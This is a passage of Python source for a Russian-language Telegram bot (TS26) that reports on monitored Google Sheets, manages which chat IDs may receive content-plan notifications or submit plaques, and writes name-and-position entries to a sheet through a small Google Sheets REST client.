    chat_ids = content_plan_chat_ids(state)
    recent_lines = []
    for chat_id, data in sorted(known_chats(state).items(), key=lambda item: item[1].get("seen_at", ""), reverse=True):
        if chat_id in admin_chat_ids():
            continue
        marker = "уже добавлен" if chat_id in chat_ids else "не добавлен"
        recent_lines.append("{} - {} - {}".format(chat_id, known_chat_label(chat_id, data), marker))
        if len(recent_lines) >= 10:
            break
    return (
        "Доступ к Контент-плану через бота.\n\n"
        "Добавленные chat_id: {}\n\n"
        "Последние пользователи:\n"
        "{}\n\n"
        "Добавить:\n"
        "/add_content_user 123456789\n\n"
        "Удалить:\n"
        "/remove_content_user 123456789\n\n"
        "Показать список:\n"
        "/content_users\n\n"
        "Человек должен хотя бы один раз написать боту, иначе Telegram может запретить отправку."
    ).format(", ".join(chat_ids) or "не добавлены", "\n".join(recent_lines) or "пока нет")


def plaque_chat_ids(state):
    chat_ids = state.setdefault("_plaque_chat_ids", [])
    if not isinstance(chat_ids, list):
        state["_plaque_chat_ids"] = []
    return [str(item).strip() for item in state["_plaque_chat_ids"] if str(item).strip()]


def add_plaque_chat_id(state, chat_id):
    chat_id = str(chat_id).strip()
    if not chat_id:
        raise ConfigError("Укажите chat_id.")
    if not re.fullmatch(r"-?\d+", chat_id):
        raise ConfigError("chat_id должен состоять только из цифр.")
    chat_ids = plaque_chat_ids(state)
    if chat_id not in chat_ids:
        chat_ids.append(chat_id)
    state["_plaque_chat_ids"] = chat_ids
    return chat_id


def remove_plaque_chat_id(state, chat_id):
    chat_id = str(chat_id).strip()
    chat_ids = plaque_chat_ids(state)
    state["_plaque_chat_ids"] = [item for item in chat_ids if item != chat_id]
    return chat_id


def plaque_access_report(state):
    chat_ids = plaque_chat_ids(state)
    recent_lines = []
    for chat_id, data in sorted(known_chats(state).items(), key=lambda item: item[1].get("seen_at", ""), reverse=True):
        if chat_id in admin_chat_ids():
            continue
        marker = "доступ есть" if chat_id in chat_ids else "нет доступа"
        recent_lines.append("{} - {} - {}".format(chat_id, known_chat_label(chat_id, data), marker))
        if len(recent_lines) >= 10:
            break
    return (
        "Доступ к генерации плашек.\n\n"
        "Добавленные chat_id: {}\n\n"
        "Последние пользователи:\n"
        "{}\n\n"
        "Добавить:\n"
        "/add_plaque_user 123456789\n\n"
        "Удалить:\n"
        "/remove_plaque_user 123456789\n\n"
        "Показать список:\n"
        "/plaque_users\n\n"
        "Человек должен хотя бы один раз написать боту, иначе Telegram может запретить отправку."
    ).format(", ".join(chat_ids) or "не добавлены", "\n".join(recent_lines) or "пока нет")


def status_report(args, sheets, state):
    active_user_modes = len(user_mode_chats(state))
    interval = getattr(args, "interval", DEFAULT_INTERVAL_SECONDS)
    duration = getattr(args, "duration", 0)
    no_admin_buttons = getattr(args, "no_admin_buttons", False)
    no_plaque_form = getattr(args, "no_plaque_form", False)
    lines = [
        "Версия: {}".format(APP_VERSION),
        "Интервал: {} сек.".format(interval),
        "Длительность: {} сек.".format(duration) if duration else "Длительность: без ограничения",
        "Админ-кнопки: {}".format("включены" if not no_admin_buttons else "выключены"),
        "Форма плашек: {}".format("включена" if not no_plaque_form else "выключена"),
        "Пользовательский режим админов: {}".format(active_user_modes),
    ]
    for sheet in sheets:
        saved = state.get(sheet_key(sheet), {})
        checked = saved.get("checked_at") or "еще не проверялась"
        rows = saved.get("rows", "н/д")
        error = saved.get("error") or "нет"
        changed = saved.get("last_change_at") or "не зафиксировано"
        delivery = saved.get("last_notification_at") or "не отправлялось"
        lines.append("{}: строк {}, проверка {}, последнее изменение {}, уведомление {}, ошибка: {}".format(
            sheet["label"], rows, checked, changed, delivery, error
        ))

    content_sheet = next((sheet for sheet in sheets if is_content_plan_sheet(sheet)), None)
    if content_sheet:
        digest = content_plan_digest_state(state)
        events = digest.get("events") or []
        pending_lines = sum(int(event.get("change_count") or 0) for event in events)
        lines.extend([
            "",
            "Почасовые уведомления Контент-плана:",
            "В очереди: событий {}, строк diff {}.".format(len(events), pending_lines),
            "Получатели: {}".format(", ".join(recipient_chat_ids(content_sheet, state=state)) or "не заданы"),
            "Последняя попытка: {}.".format(digest.get("last_attempt_at") or "не было"),
            "Последняя отправка: {}.".format(digest.get("last_sent_at") or "не было"),
            "Ошибка доставки: {}.".format(digest.get("last_error") or "нет"),
            "Повтор после ошибки: раз в {} сек.".format(max(30, CONTENT_PLAN_DELIVERY_RETRY_SECONDS)),
        ])
    return "\n".join(lines)


def send_debug_menu(args, chat_id, sheets, state):
    send_admin_message(args, chat_id, "TS26: админ-панель", admin_panel_text(args, sheets, state), reply_markup=admin_keyboard())


def send_admin_section(args, chat_id, section):
    title_by_section = {
        "monitoring": "TS26: мониторинг",
        "access": "TS26: доступы",
        "ae": "TS26: AE-ready",
        "user_tools": "TS26: пользовательский вид",
    }
    send_admin_message(args, chat_id, title_by_section.get(section, "TS26: админ-панель"), admin_section_text(section), reply_markup=admin_keyboard(section))


def send_test_to_sheet(args, chat_id, sheet, state=None):
    message = "Тестовая отправка из админ-панели.\nПолучатели: {}".format(", ".join(recipient_chat_ids(sheet, state=state)) or "не заданы")
    try:
        send_telegram(args, "TS26: тест уведомления", message, subtitle=sheet["label"], url=sheet["url"], sheet=sheet, state=state)
        send_admin_message(args, chat_id, "TS26: тест отправлен", "Таблица: {}\nПолучатели: {}".format(sheet["label"], ", ".join(recipient_chat_ids(sheet, state=state)) or "не заданы"), reply_markup=admin_keyboard("monitoring"))
    except (MonitorError, ConfigError) as exc:
        send_admin_message(args, chat_id, "TS26: ошибка теста", "Таблица: {}\n{}".format(sheet["label"], exc), reply_markup=admin_keyboard("monitoring"))


def start_screen_text(is_content_recipient=False, can_use_plaque=False):
    lines = [
        "Это бот TS26.",
        "",
        "Что доступно вам:",
    ]
    if is_content_recipient:
        lines.append("• почасовые сводки изменений Контент-плана;")
        lines.append("• полный diff по Контент-плану после сводки;")
    else:
        lines.append("• уведомления Контент-плана появятся, если админ добавит ваш chat_id;")
    if can_use_plaque:
        lines.extend(
            [
                "• добавление или обновление плашек для моушена;",
                "• пакетная отправка нескольких плашек одним сообщением;",
                "• проверка перед записью в таблицу.",
                "",
                "Нажмите «Добавить плашку» внизу чата.",
            ]
        )
    else:
        lines.extend(
            [
                "",
                "Если вам нужен доступ к плашкам, напишите администратору.",
            ]
        )
    return "\n".join(lines)


def send_start_screen(args, chat_id, state=None, is_content_recipient=False, can_use_plaque=False):
    reply_markup = plaque_reply_keyboard() if can_use_plaque else None
    send_plain_chat_message(
        args,
        chat_id,
        "TS26: старт",
        start_screen_text(is_content_recipient=is_content_recipient, can_use_plaque=can_use_plaque),
        reply_markup=reply_markup,
    )


def send_plaque_preview(args, chat_id):
    send_admin_message(args, chat_id, "TS26: превью обычного пользователя", "Ниже бот покажет, как форму видит обычный пользователь. Это только превью: Google Sheet не изменится.")
    send_start_screen(args, chat_id, can_use_plaque=True)
    send_plain_chat_message(args, chat_id, "TS26: новая плашка", "Введите имя в формате:\nФамилия Имя")
    send_plain_chat_message(args, chat_id, "TS26: новая плашка", "Введите должность для плашки.")
    preview_state = {"_plaque_sessions": {str(chat_id): {"name": "Иванов Иван", "position": "директор подразделения"}}}
    send_plaque_confirmation(args, preview_state, chat_id)
    send_plain_chat_message(args, chat_id, "TS26: готово", "После подтверждения пользователь увидит примерно так:\n\nПлашка добавлена.\nИванов Иван — директор подразделения", reply_markup=admin_keyboard("user_tools"))


def send_user_mode_start(args, state, chat_id):
    set_user_mode_chat(state, chat_id, True)
    clear_plaque_session(state, chat_id)
    send_admin_message(
        args,
        chat_id,
        "TS26: режим пользователя",
        "Теперь этот чат работает как обычный пользователь формы. Можно пройти сценарий полностью, включая запись в Google Sheet после подтверждения.\n\nЧтобы вернуться в админ-панель, нажмите кнопку или отправьте /debug.",
    )
    send_plaque_start(args, chat_id, state=state)


def google_access_report():
    auth_sources = []
    for name in ("GOOGLE_SERVICE_ACCOUNT_JSON", "GOOGLE_SERVICE_ACCOUNT_FILE", "GOOGLE_OAUTH_USER_JSON", "GOOGLE_OAUTH_USER_FILE"):
        if os.environ.get(name, "").strip():
            auth_sources.append(name)
    if not auth_sources:
        raise ConfigError("Не найдены переменные GOOGLE_SERVICE_ACCOUNT_JSON/FILE или GOOGLE_OAUTH_USER_JSON/FILE.")
    worksheet = get_plaque_worksheet()
    title = getattr(worksheet, "title", "")
    return "Google-доступ работает.\nАвторизация: {}\nТаблица: {}\nЛист: {} (gid={})\nСтартовая строка формы: {}".format(
        ", ".join(auth_sources),
        PLAQUE_SPREADSHEET_ID,
        title or "без названия",
        PLAQUE_WORKSHEET_GID,
        PLAQUE_START_ROW,
    )


def handle_admin_callback(args, sheets, state, callback):
    if args.no_admin_buttons:
        return False
    callback_id = callback.get("id")
    message = callback.get("message") or {}
    chat = message.get("chat") or {}
    from_user = callback.get("from") or {}
    chat_id, _user_id = actor_ids(chat, from_user)
    data = callback.get("data") or ""
    if not data.startswith("dbg:"):
        return False
    if not is_authorized_actor(chat, from_user, is_admin_chat_id):
        log("Админ-callback отклонен: chat_id={}, user_id={}, data={}".format(chat_id, from_user.get("id"), data))
        answer_callback(args, callback_id, "Нет доступа")
        return False
    answer_callback(args, callback_id)
    if data == "dbg:home":
        send_debug_menu(args, chat_id, sheets, state)
    elif data.startswith("dbg:menu:"):
        section = data.rsplit(":", 1)[-1]
        send_admin_section(args, chat_id, section)
    elif data == "dbg:status":
        send_admin_message(args, chat_id, "TS26: статус", status_report(args, sheets, state), reply_markup=admin_keyboard("monitoring"))
    elif data == "dbg:recipients":
        send_admin_message(args, chat_id, "TS26: получатели", recipients_report(sheets, state=state), reply_markup=admin_keyboard("monitoring"))
    elif data == "dbg:content_access":
        send_admin_message(args, chat_id, "TS26: Контент-доступ", content_access_report(state), reply_markup=admin_keyboard("access"))
    elif data == "dbg:plaque_access":
        send_admin_message(args, chat_id, "TS26: доступ к плашкам", plaque_access_report(state), reply_markup=admin_keyboard("access"))
    elif data == "dbg:ae_status":
        send_admin_message(args, chat_id, "TS26: AE-ready статус", ae_status_report(state), reply_markup=admin_keyboard("ae"))
    elif data == "dbg:ae_link":
        spreadsheet_id = ae_ready_spreadsheet_id(state)
        send_admin_message(args, chat_id, "TS26: AE-ready ссылка", ae_ready_url(spreadsheet_id) if spreadsheet_id else "AE-ready таблица еще не создана. Запустите sync.", reply_markup=admin_keyboard("ae"))
    elif data == "dbg:ae_warnings":
        send_admin_message(args, chat_id, "TS26: AE-ready warnings", ae_warnings_report(state), reply_markup=admin_keyboard("ae"))
    elif data == "dbg:figma":
        send_admin_message(args, chat_id, "TS26: Figma", figma_setup_report(state), reply_markup=admin_keyboard("ae"))
    elif data == "dbg:ae_sync":
        try:
            result = run_ae_ready_sync(args, state, force=True, rebuild=False)
            send_admin_message(args, chat_id, "TS26: AE-ready sync", "{}\n{}".format(result["message"], ae_ready_url(result.get("spreadsheet_id"))), reply_markup=admin_keyboard("ae"))
        except (MonitorError, ConfigError, ae_content_plan.AEContentPlanError) as exc:
            send_admin_message(args, chat_id, "TS26: ошибка AE-ready", str(exc), reply_markup=admin_keyboard("ae"))
    elif data == "dbg:test:startup":
        send_startup_message(args, sheets, state=state)
        send_admin_message(args, chat_id, "TS26: тест старта", "Стартовое сообщение отправлено основным получателям.", reply_markup=admin_keyboard("monitoring"))
    elif data == "dbg:google_access":
        try:
            report = google_access_report()
            send_admin_message(args, chat_id, "TS26: Google-доступ", report, reply_markup=admin_keyboard("monitoring"))
        except (MonitorError, ConfigError) as exc:
            send_admin_message(args, chat_id, "TS26: ошибка Google-доступа", str(exc), reply_markup=admin_keyboard("monitoring"))
    elif data == "dbg:preview_plaque":
        send_plaque_preview(args, chat_id)
    elif data == "dbg:start_screen":
        send_start_screen(
            args,
            chat_id,
            state=state,
            is_content_recipient=str(chat_id) in content_plan_chat_ids(state),
            can_use_plaque=can_use_plaque_form(sheets, state, chat_id),
        )
    elif data == "dbg:user_mode":
        send_user_mode_start(args, state, chat_id)
    elif data.startswith("dbg:test:"):
        label = data.split(":", 2)[2]
        sheet = find_sheet_by_label(sheets, label)
        if sheet:
            send_test_to_sheet(args, chat_id, sheet, state=state)
        else:
            send_admin_message(args, chat_id, "TS26: ошибка", "Не нашел таблицу: {}".format(label), reply_markup=admin_keyboard("monitoring"))
    else:
        send_debug_menu(args, chat_id, sheets, state)
    return True


def handle_admin_message(args, sheets, state, message):
    if args.no_admin_buttons:
        return False
    chat = message.get("chat") or {}
    from_user = message.get("from") or {}
    chat_id, user_id = actor_ids(chat, from_user)
    text = normalize_space(message.get("text") or "")
    if not text or not text.startswith("/"):
        return False
    if not is_authorized_actor(chat, from_user, is_admin_chat_id):
        log("Команда от не-админа: chat_id={}, user_id={}, text={}".format(chat_id, user_id, text.split()[0]))
        return False
    command = text.split()[0].split("@", 1)[0].lower()
    if is_user_mode_chat(state, chat_id) and command in {"/start", "/add", "/plaque", "/cancel"}:
        return False
    if command in {"/add", "/plaque"}:
        send_user_mode_start(args, state, chat_id)
        ask_plaque_name(args, state, chat_id)
        return True
    if command in {"/start", "/debug", "/admin", "/help"}:
        if is_user_mode_chat(state, chat_id):
            set_user_mode_chat(state, chat_id, False)
            clear_plaque_session(state, chat_id)
        send_debug_menu(args, chat_id, sheets, state)
    elif command == "/status":
        send_admin_message(args, chat_id, "TS26: статус", status_report(args, sheets, state), reply_markup=admin_keyboard())
    elif command == "/recipients":
        send_admin_message(args, chat_id, "TS26: получатели", recipients_report(sheets, state=state), reply_markup=admin_keyboard())
    elif command == "/content_users":
        send_admin_message(args, chat_id, "TS26: Контент-доступ", content_access_report(state), reply_markup=admin_keyboard())
    elif command == "/plaque_users":
        send_admin_message(args, chat_id, "TS26: доступ к плашкам", plaque_access_report(state), reply_markup=admin_keyboard())
    elif command == "/ae_status":
        send_admin_message(args, chat_id, "TS26: AE-ready статус", ae_status_report(state), reply_markup=admin_keyboard())
    elif command == "/ae_source":
        parts = text.split(maxsplit=1)
        if len(parts) == 1:
            send_admin_message(args, chat_id, "TS26: AE-ready источник", "Текущая ссылка:\n{}".format(ae_ready_source_url(state)), reply_markup=admin_keyboard())
            return True
        new_url = parts[1].strip()
        if "docs.google.com/spreadsheets/d/" not in new_url:
            send_admin_message(args, chat_id, "TS26: ошибка AE-ready", "Нужна ссылка на Google Sheets в формате docs.google.com/spreadsheets/d/...", reply_markup=admin_keyboard())
            return True
        ae_ready_state(state)["source_url"] = new_url
        ae_ready_state(state).pop("source_hash", None)
        send_admin_message(args, chat_id, "TS26: AE-ready источник", "Новая ссылка сохранена:\n{}\n\nТеперь можно запустить /ae_sync.".format(new_url), reply_markup=admin_keyboard())
    elif command == "/ae_link":
        spreadsheet_id = ae_ready_spreadsheet_id(state)
        send_admin_message(args, chat_id, "TS26: AE-ready ссылка", ae_ready_url(spreadsheet_id) if spreadsheet_id else "AE-ready таблица еще не создана. Запустите /ae_sync.", reply_markup=admin_keyboard())
    elif command == "/ae_warnings":
        send_admin_message(args, chat_id, "TS26: AE-ready warnings", ae_warnings_report(state), reply_markup=admin_keyboard())
    elif command == "/figma":
        send_admin_message(args, chat_id, "TS26: Figma", figma_setup_report(state), reply_markup=admin_keyboard("ae"))
    elif command in {"/ae_sync", "/ae_rebuild"}:
        try:
            result = run_ae_ready_sync(args, state, force=True, rebuild=command == "/ae_rebuild")
            send_admin_message(args, chat_id, "TS26: AE-ready sync", "{}\n{}".format(result["message"], ae_ready_url(result.get("spreadsheet_id"))), reply_markup=admin_keyboard())
        except (MonitorError, ConfigError, ae_content_plan.AEContentPlanError) as exc:
            send_admin_message(args, chat_id, "TS26: ошибка AE-ready", str(exc), reply_markup=admin_keyboard())
    elif command in {"/add_content_user", "/remove_content_user"}:
        parts = text.split()
        if len(parts) < 2:
            send_admin_message(args, chat_id, "TS26: Контент-доступ", "Укажите chat_id.\nНапример:\n{} 123456789".format(command), reply_markup=admin_keyboard())
            return True
        try:
            target_chat_id = add_content_plan_chat_id(state, parts[1]) if command == "/add_content_user" else remove_content_plan_chat_id(state, parts[1])
        except ConfigError as exc:
            send_admin_message(args, chat_id, "TS26: ошибка", str(exc), reply_markup=admin_keyboard())
            return True
        action_text = "добавлен" if command == "/add_content_user" else "удален"
        send_admin_message(args, chat_id, "TS26: Контент-доступ", "chat_id {} {} для Контент-плана.\n\n{}".format(target_chat_id, action_text, content_access_report(state)), reply_markup=admin_keyboard())
        if command == "/add_content_user":
            sheet = find_sheet_by_label(sheets, "Контент-план")
            if sheet:
                try:
                    send_telegram_to_chat_ids(args, [target_chat_id], "TS26: доступ к Контент-плану", "Вы добавлены в уведомления Контент-плана. Уведомления по Плану записи приходить не будут.", subtitle="Контент-план")
                except (MonitorError, ConfigError) as exc:
                    send_admin_message(args, chat_id, "TS26: ошибка теста", "chat_id добавлен, но тестовое сообщение не отправилось:\n{}".format(exc), reply_markup=admin_keyboard())
    elif command in {"/add_plaque_user", "/remove_plaque_user"}:
        parts = text.split()
        if len(parts) < 2:
            send_admin_message(args, chat_id, "TS26: доступ к плашкам", "Укажите chat_id.\nНапример:\n{} 123456789".format(command), reply_markup=admin_keyboard())
            return True
        try:
            target_chat_id = add_plaque_chat_id(state, parts[1]) if command == "/add_plaque_user" else remove_plaque_chat_id(state, parts[1])
        except ConfigError as exc:
            send_admin_message(args, chat_id, "TS26: ошибка", str(exc), reply_markup=admin_keyboard())
            return True
        action_text = "добавлен" if command == "/add_plaque_user" else "удален"
        send_admin_message(
            args,
            chat_id,
            "TS26: доступ к плашкам",
            "chat_id {} {} для генерации плашек.\n\n{}".format(target_chat_id, action_text, plaque_access_report(state)),
            reply_markup=admin_keyboard(),
        )
        if command == "/add_plaque_user":
            try:
                send_plain_chat_message(
                    args,
                    target_chat_id,
                    "TS26: доступ к плашкам",
                    "Вам открыт доступ к генерации плашек. Нажмите /start, чтобы увидеть форму.",
                )
            except (MonitorError, ConfigError) as exc:
                send_admin_message(args, chat_id, "TS26: ошибка теста", "chat_id добавлен, но сообщение не отправилось:\n{}".format(exc), reply_markup=admin_keyboard())
    elif command == "/preview_user":
        send_plaque_preview(args, chat_id)
    elif command == "/start_screen":
        send_start_screen(
            args,
            chat_id,
            state=state,
            is_content_recipient=str(chat_id) in content_plan_chat_ids(state),
            can_use_plaque=can_use_plaque_form(sheets, state, chat_id),
        )
    elif command in {"/user", "/user_mode", "/plaque_mode"}:
        send_user_mode_start(args, state, chat_id)
    elif command in {"/render_status", "/render_queue"}:
        send_admin_message(args, chat_id, "TS26: очередь рендера", render_queue_report(), reply_markup=admin_keyboard())
    elif command == "/render_retry":
        try:
            retried = ae_render_queue.retry_failed_jobs(AE_RENDER_QUEUE_PATH)
        except Exception as exc:  # noqa: BLE001 - surface the failure to the admin
            send_admin_message(args, chat_id, "TS26: ошибка", "Не удалось перезапустить задания: {}".format(exc), reply_markup=admin_keyboard())
            return True
        if not retried:
            message = "Неудачных заданий нет — перезапускать нечего."
        else:
            names = ["• {}".format((job.get("payload") or {}).get("name", "") or job.get("kind", "")) for job in retried[:10]]
            message = "Возвращено в очередь: {}.\n\n{}".format(len(retried), "\n".join(names))
            if len(retried) > 10:
                message += "\n… и ещё {}".format(len(retried) - 10)
            message += "\n\nУбедитесь, что в After Effects открыт нужный проект — воркер заберёт задания при следующем опросе."
        send_admin_message(args, chat_id, "TS26: перезапуск рендера", message, reply_markup=admin_keyboard())
    elif command == "/google_access":
        try:
            report = google_access_report()
            send_admin_message(args, chat_id, "TS26: Google-доступ", report, reply_markup=admin_keyboard())
        except (MonitorError, ConfigError) as exc:
            send_admin_message(args, chat_id, "TS26: ошибка Google-доступа", str(exc), reply_markup=admin_keyboard())
    elif command == "/test_content":
        sheet = find_sheet_by_label(sheets, "Контент-план")
        if sheet:
            send_test_to_sheet(args, chat_id, sheet, state=state)
    elif command == "/test_recording":
        sheet = find_sheet_by_label(sheets, "План записи")
        if sheet:
            send_test_to_sheet(args, chat_id, sheet, state=state)
    else:
        if is_user_mode_chat(state, chat_id):
            return False
        send_debug_menu(args, chat_id, sheets, state)
    return True


def plaque_sessions(state):
    sessions = state.setdefault("_plaque_sessions", {})
    if not isinstance(sessions, dict):
        state["_plaque_sessions"] = {}
    return state["_plaque_sessions"]


def plaque_session(state, chat_id):
    return plaque_sessions(state).setdefault(str(chat_id), {})


def clear_plaque_session(state, chat_id):
    plaque_sessions(state).pop(str(chat_id), None)


def user_mode_chats(state):
    chats = state.setdefault("_user_mode_chats", {})
    if not isinstance(chats, dict):
        state["_user_mode_chats"] = {}
    return state["_user_mode_chats"]


def is_user_mode_chat(state, chat_id):
    return bool(user_mode_chats(state).get(str(chat_id)))


def set_user_mode_chat(state, chat_id, enabled):
    chats = user_mode_chats(state)
    if enabled:
        chats[str(chat_id)] = {"enabled_at": now_text()}
    else:
        chats.pop(str(chat_id), None)


def can_use_plaque_form(sheets, state, chat_id):
    if is_admin_chat_id(chat_id):
        return True
    if is_user_mode_chat(state, chat_id):
        return True
    return str(chat_id).strip() in plaque_chat_ids(state)


def normalize_person_name(value):
    return normalize_space(value)


def normalize_person_key(value):
    return normalize_person_name(value).casefold()


def validate_person_name(value):
    text = normalize_person_name(value)
    if len(text.split()) < 2:
        raise ConfigError("Напишите имя в формате «Фамилия Имя».")
    if len(text) > 120:
        raise ConfigError("Имя слишком длинное, сократите до 120 символов.")
    return text


def validate_position(value):
    text = normalize_space(value)
    if not text:
        raise ConfigError("Должность не должна быть пустой.")
    if len(text) > 300:
        raise ConfigError("Должность слишком длинная, сократите до 300 символов.")
    return text


def parse_plaque_batch(value):
    lines = [line.strip() for line in value.strip().splitlines() if line.strip()]
    if not lines:
        raise ConfigError("Отправьте хотя бы одну строку.")
    if not all("_" in line for line in lines):
        if len(lines) > 1:
            raise ConfigError("Для пакетного добавления в каждой строке нужен формат «Фамилия Имя_Должность».")
        return []
    # Check the limit before validating, so an oversized paste fails fast with the
    # size message instead of a confusing per-line complaint.
    if len(lines) > 50:
        raise ConfigError("За один раз можно отправить до 50 плашек, а пришло {}.".format(len(lines)))
    entries = []
    for index, line in enumerate(lines, start=1):
        name_part, position_part = line.split("_", 1)
        try:
            name = validate_person_name(name_part)
            position = validate_position(position_part)
        except ConfigError as exc:
            raise ConfigError("Строка {}: {}".format(index, exc))
        entries.append({"name": name, "position": position})
    if len(entries) > 50:
        raise ConfigError("За один раз можно отправить до 50 плашек.")
    return entries


def send_plaque_start(args, chat_id, state=None):
    message = (
        "Можно добавить одну плашку пошагово или сразу несколько строк.\n\n"
        "Для одной плашки отправьте имя:\n"
        "Иванов Иван\n\n"
        "Для пакетного добавления отправьте строки в формате:\n"
        "Иванов Иван_Должность 1\n"
        "Дмитриев Дмитрий_Должность 2"
    )
    send_plain_chat_message(args, chat_id, "TS26: плашка", message, reply_markup=plaque_reply_keyboard())


def ask_plaque_name(args, state, chat_id):
    plaque_session(state, chat_id).update({"step": "name"})
    send_plain_chat_message(
        args,
        chat_id,
        "TS26: новая плашка",
        "Введите имя в формате:\nФамилия Имя\n\nИли отправьте несколько строк:\nФамилия Имя_Должность",
        reply_markup=plaque_reply_keyboard(),
    )


def ask_plaque_position(args, state, chat_id):
    plaque_session(state, chat_id).update({"step": "position"})
    send_plain_chat_message(args, chat_id, "TS26: новая плашка", "Введите должность для плашки.")


def send_plaque_confirmation(args, state, chat_id):
    session = plaque_session(state, chat_id)
    entries = session.get("entries")
    if isinstance(entries, list) and entries:
        lines = ["Проверьте перед отправкой:", ""]
        for index, entry in enumerate(entries, start=1):
            lines.append("{}. {} — {}".format(index, entry["name"], entry["position"]))
        lines.extend(["", "После подтверждения бот добавит или обновит эти строки в листе «Моушен»."])
        message = "\n".join(lines)
        session["step"] = "confirm"
        keyboard = plaque_confirm_user_mode_keyboard() if is_user_mode_chat(state, chat_id) else plaque_confirm_keyboard()
        send_plain_chat_message(args, chat_id, "TS26: проверьте плашки", message, reply_markup=keyboard)
        return
    name = session.get("name", "")
    position = session.get("position", "")
    message = "Проверьте перед отправкой:\n\nФИО: {}\nДолжность: {}\n\nПосле подтверждения бот добавит или обновит строку в листе «Моушен».".format(name, position)
    session["step"] = "confirm"
    keyboard = plaque_confirm_user_mode_keyboard() if is_user_mode_chat(state, chat_id) else plaque_confirm_keyboard()
    send_plain_chat_message(args, chat_id, "TS26: проверьте плашку", message, reply_markup=keyboard)


def a1_quote_sheet_title(title):
    return "'{}'".format(str(title).replace("'", "''"))


def google_api_json_request(method, url, access_token=None, payload=None, timeout=30):
    headers = {"Accept": "application/json"}
    data = None
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json; charset=utf-8"
    if access_token:
        headers["Authorization"] = "Bearer {}".format(access_token)
    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read().decode("utf-8")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise ConfigError("Google API HTTP {}: {}".format(exc.code, body[:1000]))
    if not body:
        return {}
    try:
        return json.loads(body)
    except ValueError as exc:
        raise ConfigError("Google API вернул не JSON: {}".format(exc))


class GoogleOAuthRestClient:
    """Small Google Sheets/Drive client for hosts without gspread/google-auth."""

    def __init__(self, info, timeout=30):
        self.info = dict(info)
        self.timeout = timeout
        self.access_token = self.info.get("token", "")

    def refresh_access_token(self):
        token_uri = self.info.get("token_uri") or "https://oauth2.googleapis.com/token"
        body = urllib.parse.urlencode(
            {
                "client_id": self.info.get("client_id", ""),
                "client_secret": self.info.get("client_secret", ""),
                "refresh_token": self.info.get("refresh_token", ""),
                "grant_type": "refresh_token",
            }
        ).encode("utf-8")
        request = urllib.request.Request(
            token_uri,
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                data = json.loads(response.read().decode("utf-8"))
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")
            raise ConfigError("Не удалось обновить Google OAuth token: HTTP {} {}".format(exc.code, body[:1000]))
        except (OSError, ValueError) as exc:
            raise ConfigError("Не удалось обновить Google OAuth token: {}".format(exc))
        token = data.get("access_token")
        if not token:
            raise ConfigError("Google OAuth не вернул access_token.")
        self.access_token = token
        return token

    def request(self, method, url, payload=None):
        if not self.access_token:
            self.refresh_access_token()
        try:
            return google_api_json_request(method, url, access_token=self.access_token, payload=payload, timeout=self.timeout)
        except ConfigError as exc:
            if "HTTP 401" not in str(exc):
                raise
            self.refresh_access_token()
            return google_api_json_request(method, url, access_token=self.access_token, payload=payload, timeout=self.timeout)

    def open_by_key(self, spreadsheet_id):
        return GoogleRestSpreadsheet(self, spreadsheet_id)

    def create(self, title):
        data = self.request("POST", "https://sheets.googleapis.com/v4/spreadsheets", {"properties": {"title": title}})
        spreadsheet_id = data.get("spreadsheetId")
        if not spreadsheet_id:
            raise ConfigError("Google Sheets API не вернул spreadsheetId при создании таблицы.")
        return GoogleRestSpreadsheet(self, spreadsheet_id, metadata=data)


class GoogleRestSpreadsheet:
    def __init__(self, client, spreadsheet_id, metadata=None):
        self.client = client
        self.id = spreadsheet_id
        self.spreadsheet_id = spreadsheet_id
        self._metadata = metadata

    def metadata(self, refresh=False):
        if self._metadata is None or refresh:
            url = "https://sheets.googleapis.com/v4/spreadsheets/{}?includeGridData=false".format(urllib.parse.quote(self.id))
            self._metadata = self.client.request("GET", url)
        return self._metadata

    def worksheets(self):
        sheets = self.metadata(refresh=True).get("sheets") or []
        return [GoogleRestWorksheet(self, sheet.get("properties") or {}) for sheet in sheets]

    def worksheet(self, title):
        wanted = str(title)
        for worksheet in self.worksheets():
            if worksheet.title == wanted:
                return worksheet
        raise ConfigError("Не найден лист '{}'.".format(title))

    def add_worksheet(self, title, rows=100, cols=20):
        url = "https://sheets.googleapis.com/v4/spreadsheets/{}:batchUpdate".format(urllib.parse.quote(self.id))
        payload = {
            "requests": [
                {
                    "addSheet": {
                        "properties": {
                            "title": title,
                            "gridProperties": {"rowCount": int(rows), "columnCount": int(cols)},
                        }
                    }
                }
            ]
        }
        data = self.client.request("POST", url, payload)
        properties = ((data.get("replies") or [{}])[0].get("addSheet") or {}).get("properties") or {}
        self.metadata(refresh=True)
        return GoogleRestWorksheet(self, properties or {"title": title})

    def share(self, email, perm_type="user", role="writer"):
        url = "https://www.googleapis.com/drive/v3/files/{}/permissions?sendNotificationEmail=false".format(urllib.parse.quote(self.id))
        return self.client.request("POST", url, {"type": perm_type, "role": role, "emailAddress": email})


class GoogleRestWorksheet:
    def __init__(self, spreadsheet, properties):
        self.spreadsheet = spreadsheet
        self.title = properties.get("title", "")
        self.id = properties.get("sheetId", "")

    def values_url(self, range_name, query=None):
        encoded_range = urllib.parse.quote(range_name, safe="")
        url = "https://sheets.googleapis.com/v4/spreadsheets/{}/values/{}".format(urllib.parse.quote(self.spreadsheet.id), encoded_range)
        if query:
            url = "{}?{}".format(url, urllib.parse.urlencode(query))
        return url

    def get_all_values(self):
        data = self.spreadsheet.client.request("GET", self.values_url(a1_quote_sheet_title(self.title)))
        return data.get("values") or []

    def row_values(self, row_index):
        row = int(row_index)
        data = self.spreadsheet.client.request("GET", self.values_url("{}!{}:{}".format(a1_quote_sheet_title(self.title), row, row)))
        values = data.get("values") or []
        return values[0] if values else []

    def clear(self):
        encoded_range = urllib.parse.quote("{}!A:ZZZ".format(a1_quote_sheet_title(self.title)), safe="")
        url = "https://sheets.googleapis.com/v4/spreadsheets/{}/values/{}:clear".format(urllib.parse.quote(self.spreadsheet.id), encoded_range)
        return self.spreadsheet.client.request("POST", url, {})

    def update(self, values, value_input_option="RAW"):
        url = self.values_url("{}!A1".format(a1_quote_sheet_title(self.title)), {"valueInputOption": value_input_option})
